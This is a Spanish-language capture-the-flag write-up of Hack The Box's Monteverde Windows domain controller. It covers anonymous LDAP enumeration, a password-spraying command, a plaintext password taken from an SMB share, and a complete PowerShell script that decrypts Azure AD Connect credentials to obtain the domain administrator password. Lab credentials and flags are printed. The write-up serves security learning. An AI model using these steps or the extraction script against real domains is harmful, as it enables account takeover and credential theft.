---
tags:
  - CTF
  - estado/incompleto
  - windows
  - OSCP
  - activeDirectory
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/223
dificultad: Media
ip: 10.10.10.172
os: Windows
relacionados:
---
# HackTheBox - Monteverde

RPC Enumeration
Credential Brute Force - CrackMapExec
Shell Over WinRM
Abusing Azure Admins Group - Obtaining the administrator's password (Privilege Escalation)

Aquí tienes el 'writeup' mejorado, reescrito en primera persona y con el formato solicitado.

---

## Reconocimiento

### Escaneo Inicial

Mi primer paso fue realizar un escaneo de puertos completo con `rustscan` para identificar los servicios expuestos en la máquina.
```Bash
rustscan -a $(cat ip) -- -sCV -oN 01_Reconnaissance/sCV
```
Los resultados mostraron múltiples puertos abiertos, destacando el **puerto 53 (DNS)**, **389 (LDAP)** y **445 (SMB)**. Esta combinación de servicios es un fuerte indicio de que el servidor es un **Controlador de Dominio (DC)**. El escaneo también reveló el nombre del dominio: `MEGABANK.LOCAL`.

### Enumeración del Dominio

Con un DC identificado, mi siguiente objetivo era enumerar el dominio. Comencé buscando configuraciones de baja seguridad, como enlaces anónimos de LDAP o sesiones nulas de SMB, que me permitirían obtener información sin necesidad de credenciales.

Utilicé `windapsearch.py` para verificar si se permitían conexiones anónimas a LDAP.
```Bash
wget https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py
python windapsearch.py -u "" --dc-ip 10.10.10.172
```

La conexión anónima fue exitosa. Aproveché este acceso para enumerar todos los usuarios del dominio.
```Bash
python windapsearch.py -u "" --dc-ip 10.10.10.172 -U --admin-objects
```

```
[+] ...success! Binded as:
[+] None
[+] Enumerating all AD users
[+] Found 10 users:
cn: Guest
cn: AAD_987d7f2f57d2
cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL
cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL
cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL
cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL
cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL
cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL
cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL
cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL
```

El listado reveló dos usuarios de especial interés:
- `SABatchJobs`: Probablemente una cuenta de servicio para ejecutar tareas programadas.
- `AAD_987d7f2f57d2`: La presencia de este usuario es un claro indicativo de que **Azure AD Connect** está instalado, una herramienta para sincronizar Active Directory local con Azure AD.
    

También identifiqué que el usuario `mhope` pertenecía al grupo `Remote Management Users`, lo que le otorga permisos para conectarse remotamente vía PowerShell.
```Bash
python windapsearch.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"
```

Posteriormente, utilicé `enum4linux` para obtener más detalles sobre la configuración del dominio.
```Bash
enum4linux -a 10.10.10.172
```

> [!WARNING] Vulnerabilidad Crítica
> 
> enum4linux reveló que la política de bloqueo de cuentas (Account Lockout Threshold) estaba deshabilitada (None). Esto significa que podía realizar ataques de fuerza bruta o password spraying sin riesgo de bloquear ninguna cuenta.

Finalmente, generé una lista limpia de nombres de usuario para usarla en el siguiente paso.
```Bash
python windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt
```

---

## Explotación de vulnerabilidades

### Password Spraying

Con la lista de usuarios y la confirmación de que no había política de bloqueo de cuentas, procedí a realizar un ataque de **password spraying**. Mi estrategia consistió en usar una lista de contraseñas corporativas comunes y añadir los propios nombres de usuario a la lista, ya que es una práctica insegura pero frecuente.
```Bash
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
cat users.txt >> english-basic.txt
```

Luego, utilicé `CrackMapExec` para lanzar el ataque contra el servicio SMB.
```Bash
crackmapexec smb 10.10.10.172 -d megabank -u users.txt -p english-basic.txt
```

El ataque fue exitoso y encontré una credencial válida: `SABatchJobs` / `SABatchJobs`.
```
<SNIP>
SMB 10.10.10.172 445 MONTEVERDE [+] megabank\SABatchJobs:SABatchJobs
```

### Acceso a Archivos Compartidos

Intenté ejecutar comandos con esta nueva cuenta, pero no tuve éxito. Sin embargo, sí pude enumerar los recursos compartidos SMB usando `smbmap`.
```Bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172
```

El recurso `$users` resultó ser de lectura para todos. Decidí rastrearlo en busca de archivos interesantes como documentos, archivos de texto o XML.
```Bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A '(xlsx|docx|txt|xml)' -R
```

Esta búsqueda reveló un archivo llamado `azure.xml` en la carpeta del usuario `mhope`, el cual descargué automáticamente. Al inspeccionar su contenido, encontré una contraseña en texto plano.
```XML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

> [!NOTE] Reutilización de Contraseñas
> 
> Debido a la reutilización de contraseñas, una práctica muy común, decidí probar esta credencial (4n0therD4y@n0th3r$) con el usuario mhope.

Dado que sabía que `mhope` pertenecía al grupo `Remote Management Users`, utilicé `evil-winrm` para establecer una sesión remota de PowerShell.
```Bash
evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

¡El acceso fue exitoso! Aunque el usuario `mhope` no tenía privilegios de administrador, descubrí que era miembro del grupo `MEGABANK\Azure Admins`, lo que reforzó mi sospecha sobre la importancia de Azure AD Connect en esta máquina. En este punto, capturé la bandera de usuario ubicada en `C:\Users\mhope\Desktop`.

---

## Escalada de privilegios

### Enumeración Interna

Una vez dentro, mi objetivo era escalar privilegios. Al enumerar `C:\Program Files`, confirmé la instalación de **Microsoft SQL Server** y **Microsoft Azure AD Connect**. Esto me llevó a investigar posibles vulnerabilidades relacionadas con el servicio de sincronización de AAD.

Descubrí que la forma en que AD Connect almacena las credenciales cambió con el tiempo. Las versiones antiguas usaban una base de datos SQL y el registro, mientras que las más nuevas utilizan DPAPI. Para explotar esto, necesitaba saber la versión del software. Los comandos habituales como `Get-Process` o `tasklist` fallaron por falta de permisos, así que recurrí al registro de Windows para encontrar la ruta del binario del servicio.
```PowerShell
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

Con la ruta del ejecutable `C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe`, pude obtener su versión. La versión instalada era antigua, lo que significaba que probablemente almacenaba las credenciales en la base de datos SQL local.

### Extracción de Credenciales de AD Connect
https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor

Investigando en línea, encontré un [artículo](https://www.google.com/search?q=https://blog.xpnsec.com/azuread-connect-for-red-teamers/) que detallaba el proceso de explotación manual para versiones antiguas. El plan era conectarse a la base de datos `ADSync` y extraer los datos necesarios para descifrar la contraseña de la cuenta de servicio.

En una instalación personalizada como esta, AD Connect usaba una instancia completa de SQL Server en lugar de una LocalDB. Utilicé la herramienta nativa `sqlcmd.exe` para extraer los valores de `instance_id`, `keyset_id` y `entropy` de la base de datos.
```PowerShell
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```

Con estos valores, modifiqué el script PoC del artículo para adaptarlo a este entorno. Específicamente, hardcodeé los valores obtenidos y ajusté la cadena de conexión para apuntar a la instancia de SQL Server `MONTEVERDE`.

El script final quedó así:
```PowerShell
Function Get-ADConnectPassword{
    Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
    # Valores extraídos manualmente de la base de datos
    $key_id = 1
    $instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
    $entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
    
    # Cadena de conexión modificada para la instancia SQL personalizada
    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
    $client.Open()
    
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    
    $config = $reader.GetString(0)
    $crypted = $reader.GetString(1)
    $reader.Close()
    
    add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)
    
    $key = $null
    $km.GetActiveCredentialKey([ref]$key)
    $key2 = $null
    $km.GetKey(1, [ref]$key2)
    
    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
    
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
    
    Write-Host ("Domain: " + $domain.Domain)
    Write-Host ("Username: " + $username.Username)
    Write-Host ("Password: " + $password.Password)
}
```

Guardé este script como `adconnect.ps1` y lo ejecuté desde mi sesión de `evil-winrm` usando la opción `-s` para cargar scripts desde mi máquina local.
```Bash
evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s .
*Evil-WinRM* PS C:\Users\mhope\Documents> adconnect.ps1
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-ADConnectPassword
```

El script funcionó a la perfección y reveló las credenciales de la cuenta de sincronización.

> [!DANGER] Mala Configuración Crítica
> 
> En lugar de usar una cuenta de servicio de bajos privilegios (como NT SERVICE\ADSync en una instalación por defecto), la instalación personalizada de Azure AD Connect fue configurada para usar la cuenta del Administrador del Dominio.

Con la contraseña `d0m@in4dminyeah!`, me conecté como `administrator` usando `evil-winrm`.
```Bash
evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
```

Finalmente, con acceso de administrador del dominio, obtuve la bandera de root de `C:\Users\Administrator\Desktop`.

---

### Vulnerabilidades y Conceptos Clave

- **Enumeración de Dominio Anónima**: La configuración de LDAP permitió el acceso anónimo, facilitando la recopilación de usuarios y grupos del dominio.
    
- **Ausencia de Política de Bloqueo de Cuentas**: Una configuración de seguridad crítica que permitió realizar un ataque de _password spraying_ sin consecuencias.
    
- **Password Spraying**: Técnica efectiva para encontrar credenciales débiles en un entorno sin protección contra ataques de fuerza bruta.
    
- **Exposición de Información Sensible**: Una contraseña fue encontrada en texto claro dentro de un archivo `XML` en un recurso compartido accesible.
    
- **Reutilización de Contraseñas**: El usuario `mhope` reutilizó la contraseña de Azure en su cuenta de Active Directory local.
    
- **Mala Configuración de Azure AD Connect**: La vulnerabilidad principal residía en una versión antigua y una configuración personalizada que utilizaba la cuenta de administrador del dominio para la sincronización, exponiendo sus credenciales.



## Bandera(s)

> [!FLAG] `flag{user}`
> ae4406451c1a4c77d16938aa8ed97269
^bandera

> [!FLAG] `flag{root}`
>59b6b495bd6e4c6ce45ae3a4ea6804a1
^bandera